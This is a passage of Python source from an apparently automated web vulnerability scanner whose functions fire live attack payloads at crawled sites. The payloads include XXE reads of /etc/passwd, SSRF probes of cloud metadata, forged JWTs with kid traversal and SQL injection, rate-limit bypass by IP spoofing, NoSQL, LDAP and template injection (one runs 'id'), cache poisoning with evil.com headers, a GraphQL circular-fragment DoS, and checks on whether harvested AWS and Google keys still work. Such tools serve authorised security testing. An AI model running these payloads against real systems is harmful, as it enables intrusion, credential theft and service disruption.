                            "template": "apex-oauth-pkce",
                        })

                # 2. State parameter not required
                no_state_url = f"{url}?client_id=test&response_type=code&redirect_uri=https://example.com"
                r3 = _S.get(no_state_url, timeout=5, allow_redirects=False)
                if r3.status_code in (200, 302):
                    loc3 = r3.headers.get("Location", "")
                    if "code=" in loc3 and "state=" not in loc3:
                        findings.append({
                            "type": "OAuth Missing State Parameter (CSRF)",
                            "severity": "high",
                            "url": no_state_url,
                            "detail": "OAuth flow proceeds without state parameter — CSRF attack possible",
                            "template": "apex-oauth-state",
                        })

                # 3. Token in fragment leaks via Referer
                if "access_token=" in page["url"] or "id_token=" in page["url"]:
                    findings.append({
                        "type": "OAuth Token in URL Fragment",
                        "severity": "high",
                        "url": page["url"],
                        "detail": "OAuth token in URL — leaks via Referer header to third-party resources",
                        "template": "apex-oauth-fragment",
                    })

            except: continue

    return findings


def scan_xxe_file_upload(crawl_data):
    """XXE via file upload — SVG, DOCX, XLSX, XML files."""
    findings = []
    xxe_svg = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

    xxe_xml = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    for form in crawl_data.get("forms", []):
        file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
        if not file_inputs: continue
        action = form.get("action", "")
        if not action: continue

        for fname, content, ctype in [
            ("test.svg", xxe_svg, "image/svg+xml"),
            ("test.xml", xxe_xml, "application/xml"),
            ("test.docx", xxe_xml, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ]:
            try:
                files = {file_inputs[0].get("name", "file"): (fname, content, ctype)}
                r = _S.post(action, files=files, timeout=8)
                if "root:" in r.text or "daemon:" in r.text:
                    findings.append({
                        "type": f"XXE via File Upload ({fname})",
                        "severity": "critical",
                        "url": action,
                        "detail": f"XXE in {fname} upload reads /etc/passwd",
                        "template": "apex-xxe-upload",
                    })
                    break
                elif r.status_code in (200, 201) and "xxe" not in r.text.lower():
                    # File accepted — may be processed server-side
                    findings.append({
                        "type": f"Potential XXE via File Upload ({fname})",
                        "severity": "medium",
                        "url": action,
                        "detail": f"{fname} accepted — server may process XML entities",
                        "template": "apex-xxe-upload",
                    })
            except: continue
    return findings


def scan_ssrf_redirect_chain(crawl_data):
    """SSRF via open redirect chains — use open redirect to bypass SSRF allowlists."""
    findings = []
    # Find open redirects first
    open_redirects = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in ("url", "redirect", "next", "goto", "dest", "return"):
                continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["https://169.254.169.254/latest/meta-data/"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=5, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "169.254.169.254" in loc:
                    findings.append({
                        "type": "SSRF via Open Redirect Chain",
                        "severity": "critical",
                        "url": test_url,
                        "detail": f"Open redirect to cloud metadata — SSRF via redirect chain",
                        "template": "apex-ssrf-redirect",
                    })
                    open_redirects.append(url)
            except: continue

    # Test SSRF endpoints with redirect chain
    ssrf_params = ("url", "src", "source", "fetch", "proxy", "request", "uri")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in ssrf_params: continue
            if not open_redirects: continue
            # Use open redirect as SSRF bypass
            redirect_url = open_redirects[0].split("?")[0] + f"?url=http://169.254.169.254/"
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [redirect_url]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=8)
                if any(x in r.text for x in ["ami-id", "instance-id", "iam"]):
                    findings.append({
                        "type": "SSRF via Redirect Chain Bypass",
                        "severity": "critical",
                        "url": test_url,
                        "detail": "SSRF allowlist bypassed via open redirect chain",
                        "template": "apex-ssrf-redirect",
                    })
            except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 12: JWT kid injection, rate limit bypass via headers,
#                 IDOR in JSON body, auth bypass via content-type,
#                 SSRF via SVG, NoSQL operator injection,
#                 unkeyed cache poisoning, GraphQL alias introspection bypass,
#                 CORS with Vary:Origin, API rate limit header rotation
# ---------------------------------------------------------------------------

def scan_jwt_kid_injection(crawl_data):
    """JWT kid (Key ID) parameter injection — path traversal and SQL injection in kid."""
    import base64 as _b64, json as _j, hmac as _hm, hashlib as _hl
    findings = []
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            sources = list(r.cookies.values()) + [r.headers.get("Authorization", ""), r.text[:2000]]
            for src in sources:
                for jwt in jwt_re.findall(str(src)):
                    parts = jwt.split(".")
                    if len(parts) != 3: continue
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        header = _j.loads(_b64.urlsafe_b64decode(pad(parts[0])))
                        payload = _j.loads(_b64.urlsafe_b64decode(pad(parts[1])))
                        if "kid" not in header: continue

                        base_url = "/".join(page["url"].split("/", 3)[:3])

                        # Test 1: kid path traversal — point to /dev/null (empty key)
                        new_header = dict(header)
                        new_header["kid"] = "../../dev/null"
                        new_header_b64 = _b64.urlsafe_b64encode(
                            _j.dumps(new_header, separators=(",",":")).encode()
                        ).rstrip(b"=").decode()
                        # Sign with empty key
                        msg = f"{new_header_b64}.{parts[1]}".encode()
                        sig = _hm.new(b"", msg, _hl.sha256).digest()
                        sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                        forged = f"{new_header_b64}.{parts[1]}.{sig_b64}"

                        r2 = _S.get(page["url"], timeout=5,
                                   headers={"Authorization": f"Bearer {forged}"})
                        if r2.status_code == 200 and r2.status_code != r.status_code:
                            findings.append({
                                "type": "JWT kid Path Traversal (Empty Key)",
                                "severity": "critical",
                                "url": page["url"],
                                "detail": "kid=../../dev/null accepted — JWT signed with empty key",
                                "template": "apex-jwt-kid",
                            })

                        # Test 2: kid SQL injection
                        new_header["kid"] = "' UNION SELECT 'secret'--"
                        new_header_b64 = _b64.urlsafe_b64encode(
                            _j.dumps(new_header, separators=(",",":")).encode()
                        ).rstrip(b"=").decode()
                        msg = f"{new_header_b64}.{parts[1]}".encode()
                        sig = _hm.new(b"secret", msg, _hl.sha256).digest()
                        sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                        forged_sql = f"{new_header_b64}.{parts[1]}.{sig_b64}"
                        r3 = _S.get(page["url"], timeout=5,
                                   headers={"Authorization": f"Bearer {forged_sql}"})
                        if r3.status_code == 200:
                            findings.append({
                                "type": "JWT kid SQL Injection",
                                "severity": "critical",
                                "url": page["url"],
                                "detail": "kid parameter accepts SQL — JWT key fetched from DB via SQLi",
                                "template": "apex-jwt-kid",
                            })
                    except: pass
        except: pass
    return findings


def scan_rate_limit_bypass_headers(crawl_data):
    """Bypass rate limiting via IP spoofing headers — rotate X-Forwarded-For."""
    findings = []
    tested = set()
    spoof_headers = [
        "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
        "True-Client-IP", "CF-Connecting-IP", "X-Originating-IP",
    ]
    for page in crawl_data.get("pages", []):
        if not any(x in page["url"].lower() for x in ["login", "auth", "api", "forgot", "reset"]):
            continue
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)

        for path in ["/login", "/api/login", "/auth", "/api/auth", "/forgot-password"]:
            url = f"{base}{path}"
            try:
                # First: hit rate limit
                blocked = False
                for i in range(20):
                    r = _S.post(url, json={"email": "test@test.com", "password": "wrong"},
                               timeout=3)
                    if r.status_code == 429 or "rate" in r.text.lower():
                        blocked = True
                        break

                if not blocked: continue

                # Now try bypass with rotating IPs
                for header in spoof_headers:
                    import random
                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    r_bypass = _S.post(url,
                                      json={"email": "test@test.com", "password": "wrong"},
                                      timeout=5, headers={header: fake_ip})
                    if r_bypass.status_code != 429 and "rate" not in r_bypass.text.lower():
                        findings.append({
                            "type": f"Rate Limit Bypass via {header}",
                            "severity": "high",
                            "url": url,
                            "detail": f"{header}: {fake_ip} bypasses rate limiting — brute force possible",
                            "template": "apex-ratelimit-bypass",
                        })
                        break
            except: continue
    return findings


def scan_idor_json_body(crawl_data):
    """IDOR in POST/PUT JSON body — user_id, account_id in request body."""
    findings = []
    id_fields = ("user_id", "userId", "account_id", "accountId", "id", "owner_id",
                 "ownerId", "customer_id", "customerId", "profile_id", "profileId")
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() not in ("POST", "PUT", "PATCH"): continue
        action = form.get("action", "")
        if not action: continue
        inputs = form.get("inputs", [])
        for inp in inputs:
            name = inp.get("name", "")
            if name.lower() not in id_fields: continue
            orig_val = inp.get("value", "1")
            try:
                # Get baseline with original ID
                data = {i.get("name","f"): i.get("value","test") for i in inputs}
                r_orig = _S.post(action, json=data, timeout=5)
                # Try different IDs
                for test_id in ["1", "2", "3", str(int(orig_val or "1") + 1)]:
                    if test_id == str(orig_val): continue
                    data[name] = test_id
                    r_test = _S.post(action, json=data, timeout=5)
                    if (r_test.status_code == 200 and
                            r_test.text != r_orig.text and
                            len(r_test.content) > 50):
                        findings.append({
                            "type": f"IDOR in JSON Body: {name}",
                            "severity": "high",
                            "url": action,
                            "detail": f"Changing {name} from {orig_val} to {test_id} returns different data",
                            "template": "apex-idor-json",
                        })
                        break
            except: continue
    return findings


def scan_auth_bypass_content_type(crawl_data):
    """Auth bypass via Content-Type manipulation — JSON vs form-encoded validation differences."""
    findings = []
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "").lower()
        if not any(x in action for x in ["login", "auth", "signin", "admin"]): continue
        inputs = form.get("inputs", [])
        data = {i.get("name","f"): i.get("value","test") for i in inputs}

        try:
            # Baseline: form-encoded
            r_form = _S.post(form["action"], data=data, timeout=5)
            # Test 1: JSON content-type
            r_json = _S.post(form["action"], json=data, timeout=5,
                            headers={"Content-Type": "application/json"})
            # Test 2: XML content-type
            xml_body = "<root>" + "".join(f"<{k}>{v}</{k}>" for k,v in data.items()) + "</root>"
            r_xml = _S.post(form["action"], data=xml_body, timeout=5,
                           headers={"Content-Type": "application/xml"})
            # Test 3: Multipart
            r_multi = _S.post(form["action"], files={k: (None, v) for k,v in data.items()}, timeout=5)

            for r_test, ctype in [(r_json, "JSON"), (r_xml, "XML"), (r_multi, "Multipart")]:
                if (r_test.status_code == 200 and r_form.status_code != 200):
                    findings.append({
                        "type": f"Auth Bypass via Content-Type ({ctype})",
                        "severity": "critical",
                        "url": form["action"],
                        "detail": f"{ctype} content-type bypasses auth check that blocks form-encoded",
                        "template": "apex-ct-bypass",
                    })
                elif (r_test.status_code != r_form.status_code and
                      r_test.status_code in (200, 302)):
                    findings.append({
                        "type": f"Different Response for Content-Type ({ctype})",
                        "severity": "medium",
                        "url": form["action"],
                        "detail": f"{ctype} returns {r_test.status_code} vs form-encoded {r_form.status_code}",
                        "template": "apex-ct-bypass",
                    })
        except: continue
    return findings


def scan_ssrf_via_svg(crawl_data):
    """SSRF via SVG upload — SVG with external entity or href."""
    findings = []
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:6379",  # Redis
        "http://localhost:27017",  # MongoDB
    ]
    for target in ssrf_targets[:2]:
        svg_ssrf = f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="{target}" height="100" width="100"/>
</svg>""".encode()

        for form in crawl_data.get("forms", []):
            file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
            if not file_inputs: continue
            action = form.get("action", "")
            if not action: continue
            try:
                files = {file_inputs[0].get("name", "file"): ("test.svg", svg_ssrf, "image/svg+xml")}
                r = _S.post(action, files=files, timeout=8)
                if any(x in r.text for x in ["ami-id", "instance-id", "ssh-", "root:", "redis"]):
                    findings.append({
                        "type": "SSRF via SVG Upload",
                        "severity": "critical",
                        "url": action,
                        "detail": f"SVG with external href reaches {target}",
                        "template": "apex-ssrf-svg",
                    })
                    break
            except: continue
    return findings


def scan_unkeyed_cache_poisoning(crawl_data):
    """Web cache poisoning via unkeyed headers — headers not in cache key but reflected."""
    findings = []
    tested = set()
    # Headers that are often unkeyed but reflected
    unkeyed_headers = [
        ("X-Forwarded-Host", "apex-cache-poison.evil.com"),
        ("X-Forwarded-Scheme", "https://apex-cache-poison.evil.com"),
        ("X-Original-URL", "/apex-cache-poison"),
        ("X-Rewrite-URL", "/apex-cache-poison"),
        ("X-Forwarded-Port", "1337"),
        ("X-Host", "apex-cache-poison.evil.com"),
        ("X-Forwarded-Server", "apex-cache-poison.evil.com"),
        ("Forwarded", "host=apex-cache-poison.evil.com"),
    ]
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            baseline = _S.get(url, timeout=5)
        except: continue

        for header, value in unkeyed_headers:
            try:
                r = _S.get(url, timeout=5, headers={header: value})
                # Check if value is reflected in response
                if "apex-cache-poison" in r.text and "apex-cache-poison" not in baseline.text:
                    # Check if response is cacheable
                    cache_control = r.headers.get("Cache-Control", "")
                    age = r.headers.get("Age", "")
                    cf_cache = r.headers.get("CF-Cache-Status", "")
                    is_cacheable = (
                        "no-store" not in cache_control and
                        "private" not in cache_control
                    )
                    sev = "critical" if is_cacheable else "high"
                    findings.append({
                        "type": f"Unkeyed Cache Poisoning via {header}",
                        "severity": sev,
                        "url": url,
                        "detail": f"{header}: {value} reflected in response — {'cacheable' if is_cacheable else 'not cached but reflected'}",
                        "template": "apex-cache-unkeyed",
                    })
                    break
            except: continue
    return findings


def scan_graphql_alias_introspection(crawl_data):
    """Bypass disabled GraphQL introspection via alias batching and field suggestion."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Check if introspection is disabled
                r = _S.post(url, json={"query": "{__schema{types{name}}}"},
                           headers={"Content-Type": "application/json"}, timeout=5)
                if "__schema" in r.text: continue  # Introspection enabled, skip

                if r.status_code not in (200, 400): continue

                # Bypass 1: Use __type instead of __schema
                r2 = _S.post(url, json={"query": "{__type(name:\"Query\"){fields{name}}}"},
                            headers={"Content-Type": "application/json"}, timeout=5)
                if "fields" in r2.text and "__type" not in r2.text:
                    import json as _j
                    try:
                        data = _j.loads(r2.text)
                        fields = [f["name"] for f in
                                  data.get("data",{}).get("__type",{}).get("fields",[]) or []]
                        if fields:
                            findings.append({
                                "type": "GraphQL Introspection Bypass via __type",
                                "severity": "medium",
                                "url": url,
                                "detail": f"Schema leaked via __type despite disabled introspection: {', '.join(fields[:10])}",
                                "template": "apex-gql-bypass",
                            })
                    except: pass

                # Bypass 2: Clairvoyance-style — probe with common type names
                for type_name in ["User", "Admin", "Query", "Mutation", "Account", "Payment"]:
                    r3 = _S.post(url,
                                json={"query": f'{{__type(name:"{type_name}"){{fields{{name type{{name}}}}}}}}'},
                                headers={"Content-Type": "application/json"}, timeout=3)
                    if r3.status_code == 200 and "fields" in r3.text:
                        try:
                            data = _j.loads(r3.text)
                            fields = data.get("data",{}).get("__type",{})
                            if fields and fields.get("fields"):
                                field_names = [f["name"] for f in fields["fields"][:5]]
                                findings.append({
                                    "type": f"GraphQL Type Disclosure: {type_name}",
                                    "severity": "medium",
                                    "url": url,
                                    "detail": f"Type {type_name} fields: {', '.join(field_names)}",
                                    "template": "apex-gql-bypass",
                                })
                        except: pass
            except: continue
    return findings


def scan_nosql_operator_injection(crawl_data):
    """NoSQL injection via MongoDB operators in JSON body and query params."""
    findings = []
    # MongoDB operator payloads
    nosql_payloads = [
        {"$gt": ""},
        {"$ne": "invalid_xyz"},
        {"$regex": ".*"},
        {"$where": "1==1"},
        {"$exists": True},
    ]
    success_indicators = ["welcome", "dashboard", "logged", "token", "success",
                          "user", "profile", "account", "home"]
    error_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "unauthorized"]

    # Test forms
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        inputs = form.get("inputs", [])
        auth_inputs = [i for i in inputs if i.get("type") in ("text", "email", "password")
                       or any(x in i.get("name","").lower() for x in ("user","email","pass","login"))]
        if not auth_inputs: continue

        try:
            # Baseline with wrong creds
            baseline_data = {i.get("name","f"): "wrong_value_xyz" for i in inputs}
            baseline = _S.post(action, json=baseline_data, timeout=5)
            baseline_body = baseline.text.lower()

            for payload in nosql_payloads:
                data = dict(baseline_data)
                for inp in auth_inputs:
                    data[inp.get("name","f")] = payload
                r = _S.post(action, json=data, timeout=5,
                           headers={"Content-Type": "application/json"})
                body = r.text.lower()
                if (r.status_code in (200, 302) and
                        any(x in body for x in success_indicators) and
                        not any(x in body for x in error_indicators) and
                        r.text != baseline.text):
                    findings.append({
                        "type": "NoSQL Injection (MongoDB Operator)",
                        "severity": "critical",
                        "url": action,
                        "detail": f"Operator {list(payload.keys())[0]} bypasses authentication",
                        "template": "apex-nosql-op",
                    })
                    break
        except: continue

    # Test GET params
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload_str in ["[$ne]=invalid", "[$gt]=", "[$regex]=.*"]:
                try:
                    test_url = f"{url.split('?')[0]}?{p}{payload_str}"
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200 and len(r.content) > 100:
                        findings.append({
                            "type": "NoSQL Injection (GET Operator)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"MongoDB operator in param {p} returns data",
                            "template": "apex-nosql-op",
                        })
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 13: LDAP injection, Twig/Smarty SSTI, blind XPath,
#                 WebSocket origin bypass, Server-Timing oracle,
#                 CSP bypass via JSONP, API key rotation bypass,
#                 GraphQL circular fragment DoS, javascript: redirect
# ---------------------------------------------------------------------------

def scan_ldap_injection(crawl_data):
    """LDAP injection in authentication and search forms."""
    findings = []
    # LDAP injection payloads
    payloads = [
        ("*", "wildcard — matches all"),
        ("*)(uid=*))(|(uid=*", "filter bypass"),
        ("admin)(&(password=*", "auth bypass"),
        ("*)(|(objectClass=*", "objectClass dump"),
        (")(|(cn=*", "cn wildcard"),
        ("\\2a)(uid=*))(|(uid=\\2a", "encoded wildcard"),
    ]
    error_markers = ["ldap", "ldap_search", "invalid dn", "ldap error",
                     "javax.naming", "ldapexception", "invalid filter"]
    success_markers = ["welcome", "dashboard", "logged in", "success", "token"]

    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        inputs = form.get("inputs", [])
        auth_inputs = [i for i in inputs
                       if any(x in i.get("name","").lower()
                              for x in ("user","email","login","uid","cn","dn"))]
        if not auth_inputs: continue

        try:
            baseline = _S.post(action,
                               data={i.get("name","f"): "test" for i in inputs},
                               timeout=5)
        except: continue

        for payload, desc in payloads:
            try:
                data = {i.get("name","f"): i.get("value","test") for i in inputs}
                for inp in auth_inputs:
                    data[inp.get("name","f")] = payload
                r = _S.post(action, data=data, timeout=5)
                body = r.text.lower()
                if any(e in body for e in error_markers):
                    findings.append({
                        "type": "LDAP Injection (Error-Based)",
                        "severity": "high",
                        "url": action,
                        "detail": f"LDAP error triggered by payload: {payload} ({desc})",
                        "template": "apex-ldap",
                    })
                    break
                if (r.status_code in (200, 302) and
                        any(s in body for s in success_markers) and
                        r.text != baseline.text):
                    findings.append({
                        "type": "LDAP Injection (Auth Bypass)",
                        "severity": "critical",
                        "url": action,
                        "detail": f"LDAP filter bypass with: {payload} ({desc})",
                        "template": "apex-ldap",
                    })
                    break
            except: continue
    return findings


def scan_template_injection_twig(crawl_data):
    """Twig/Smarty/Pebble/Freemarker SSTI — different syntax from Jinja2."""
    findings = []
    payloads = [
        # Twig
        ("{{7*7}}", "49"),
        ("{{7*'7'}}", "49"),
        ("{{'a'~'b'}}", "ab"),
        # Smarty
        ("{7*7}", "49"),
        ("{math equation='7*7'}", "49"),
        # Pebble
        ("{{7*7}}", "49"),
        # Freemarker
        ("${7*7}", "49"),
        ("<#assign x=7*7>${x}", "49"),
        # Velocity
        ("#set($x=7*7)$x", "49"),
        # Mako
        ("${7*7}", "49"),
        # Handlebars
        ("{{#with 7}}{{this}}{{/with}}", "7"),
        # ERB (Ruby)
        ("<%= 7*7 %>", "49"),
        # Jinja2 (already covered but include for completeness)
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, marker in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if marker in r.text and payload not in r.text:
                        findings.append({
                            "type": "Server-Side Template Injection (Twig/Smarty/Freemarker)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Template executed via param '{p}': {payload} → {marker}",
                            "template": "apex-ssti-twig",
                        })
                        break
                except: continue
    return findings


def scan_websocket_origin_bypass(crawl_data):
    """WebSocket connections without Origin validation — cross-site WebSocket hijacking."""
    findings = []
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            for ws_url in ws_urls[:3]:
                # Try connecting with evil origin
                try:
                    import websocket as _ws
                    headers = {"Origin": "https://evil.com"}
                    ws = _ws.create_connection(ws_url, timeout=5, header=headers)
                    # If connection succeeds without origin check
                    ws.send('{"type":"ping"}')
                    result = ws.recv()
                    ws.close()
                    findings.append({
                        "type": "WebSocket Cross-Origin Hijacking",
                        "severity": "high",
                        "url": ws_url,
                        "detail": "WebSocket accepts connections from evil.com origin — CSWSH possible",
                        "template": "apex-ws-origin",
                    })
                except ImportError:
                    # websocket-client not installed — flag for manual testing
                    findings.append({
                        "type": "WebSocket Endpoint (Manual Origin Check Needed)",
                        "severity": "info",
                        "url": ws_url,
                        "detail": f"WebSocket found at {ws_url} — manually verify Origin header validation",
                        "template": "apex-ws-origin",
                    })
                except Exception:
                    pass
        except: pass
    return findings


def scan_server_timing_oracle(crawl_data):
    """Server-Timing header leaks internal timing info — user enumeration, cache status."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            timing = r.headers.get("Server-Timing", "")
            if timing:
                # Parse timing values
                import re as _re
                durations = _re.findall(r'dur=([0-9.]+)', timing)
                metrics = _re.findall(r'([a-zA-Z_-]+);', timing)
                sensitive = [m for m in metrics if any(x in m.lower()
                             for x in ["db", "sql", "cache", "auth", "user", "query",
                                       "redis", "mongo", "elastic", "backend"])]
                if sensitive:
                    findings.append({
                        "type": "Server-Timing Leaks Internal Metrics",
                        "severity": "low",
                        "url": page["url"],
                        "detail": f"Server-Timing exposes: {', '.join(sensitive)} — timing oracle possible",
                        "template": "apex-server-timing",
                    })
                elif timing:
                    findings.append({
                        "type": "Server-Timing Header Present",
                        "severity": "info",
                        "url": page["url"],
                        "detail": f"Server-Timing: {timing[:100]} — may leak internal timing",
                        "template": "apex-server-timing",
                    })
        except: pass

    # Test timing difference for valid vs invalid users
    for page in crawl_data.get("pages", []):
        if not any(x in page["url"].lower() for x in ["login", "auth", "signin"]): continue
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/login", "/api/login", "/auth"]:
            try:
                import time as _t
                times = []
                for email in ["admin@admin.com", "nonexistent_xyz_12345@test.com"]:
                    start = _t.time()
                    r = _S.post(f"{base}{path}",
                               json={"email": email, "password": "wrong"},
                               timeout=5)
                    elapsed = _t.time() - start
                    timing = r.headers.get("Server-Timing", "")
                    times.append((email, elapsed, timing))
                if len(times) == 2:
                    diff = abs(times[0][1] - times[1][1])
                    if diff > 0.15:  # 150ms difference
                        findings.append({
                            "type": "Timing Oracle: User Enumeration",
                            "severity": "medium",
                            "url": f"{base}{path}",
                            "detail": f"Valid user takes {times[0][1]*1000:.0f}ms vs invalid {times[1][1]*1000:.0f}ms ({diff*1000:.0f}ms diff)",
                            "template": "apex-timing-oracle",
                        })
            except: continue
    return findings


def scan_csp_bypass_jsonp(crawl_data):
    """CSP bypass via JSONP endpoints — script-src allows domain with JSONP."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            csp = r.headers.get("Content-Security-Policy", "")
            if not csp: continue

            # Extract allowed script domains from CSP
            script_src = re.search(r'script-src[^;]+', csp)
            if not script_src: continue
            allowed_domains = re.findall(r'https?://([^\s;]+)', script_src.group())

            # Check if any allowed domain has a JSONP endpoint
            for domain in allowed_domains[:5]:
                for jsonp_path in ["/jsonp", "/api/jsonp", "/callback",
                                   "/api/callback", "/json", "/data"]:
                    try:
                        r2 = _S.get(f"https://{domain}{jsonp_path}?callback=alert",
                                   timeout=3)
                        if "alert(" in r2.text and r2.headers.get("content-type","").startswith("application/javascript"):
                            findings.append({
                                "type": "CSP Bypass via JSONP",
                                "severity": "high",
                                "url": page["url"],
                                "detail": f"CSP allows {domain} which has JSONP at {jsonp_path} — XSS possible",
                                "template": "apex-csp-jsonp",
                            })
                    except: continue
        except: pass
    return findings


def scan_api_key_rotation_bypass(crawl_data, web_targets):
    """Test if old/rotated API keys still work — common after key rotation incidents."""
    findings = []
    # Look for API keys in JS files and test if they're still valid
    for page in crawl_data.get("pages", [])[:5]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Find API key patterns
            key_patterns = [
                (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
                (r'sk_live_[0-9a-zA-Z]{24,}', "Stripe Secret Key"),
                (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
                (r'gh[pousr]_[A-Za-z0-9_]{36,}', "GitHub Token"),
                (r'xox[bpors]-[0-9a-zA-Z]{10,48}', "Slack Token"),
                (r'[0-9a-f]{32}', "Generic 32-char hex key"),
            ]
            for pattern, key_type in key_patterns:
                matches = re.findall(pattern, r.text)
                for key in matches[:2]:
                    # Test if key is still valid
                    if key_type == "AWS Access Key":
                        try:
                            test_r = requests.get(
                                "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
                                headers={"Authorization": f"AWS4-HMAC-SHA256 Credential={key}"},
                                timeout=5
                            )
                            if "UserId" in test_r.text:
                                findings.append({
                                    "type": f"Valid {key_type} Found",
                                    "severity": "critical",
                                    "url": page["url"],
                                    "detail": f"Active {key_type}: {key[:8]}...",
                                    "template": "apex-key-rotation",
                                })
                        except: pass
                    elif key_type == "Google API Key":
                        try:
                            test_r = requests.get(
                                f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={key}",
                                timeout=5
                            )
                            if test_r.status_code == 200:
                                findings.append({
                                    "type": f"Valid {key_type} Found",
                                    "severity": "critical",
                                    "url": page["url"],
                                    "detail": f"Active {key_type}: {key[:8]}...",
                                    "template": "apex-key-rotation",
                                })
                        except: pass
                    else:
                        # Just report the key found
                        if len(key) >= 20:
                            findings.append({
                                "type": f"Potential {key_type} in Source",
                                "severity": "high",
                                "url": page["url"],
                                "detail": f"{key_type}: {key[:12]}... — verify if still active",
                                "template": "apex-key-rotation",
                            })
        except: pass
    return findings


def scan_graphql_circular_fragment(crawl_data):
    """GraphQL circular fragment DoS — deeply nested circular references exhaust server."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Check endpoint exists
                probe = _S.post(url, json={"query": "{__typename}"},
                               headers={"Content-Type": "application/json"}, timeout=3)
                if probe.status_code not in (200, 400): continue

                # Circular fragment query
                circular = """
fragment A on Query { ...B }
fragment B on Query { ...C }
fragment C on Query { ...A }
{ ...A }
"""
                import time as _t
                start = _t.time()
                r = _S.post(url, json={"query": circular},
                           headers={"Content-Type": "application/json"}, timeout=10)
                elapsed = _t.time() - start

                if elapsed > 3:
                    findings.append({
                        "type": "GraphQL Circular Fragment DoS",
                        "severity": "high",
                        "url": url,
                        "detail": f"Circular fragment query took {elapsed:.1f}s — no cycle detection",
                        "template": "apex-gql-circular",
                    })
                elif r.status_code == 200 and "errors" not in r.text:
                    findings.append({
                        "type": "GraphQL No Circular Fragment Protection",
                        "severity": "medium",
                        "url": url,
                        "detail": "Server accepted circular fragment without error",
                        "template": "apex-gql-circular",
                    })
            except requests.exceptions.Timeout:
                findings.append({
                    "type": "GraphQL Circular Fragment DoS (Timeout)",
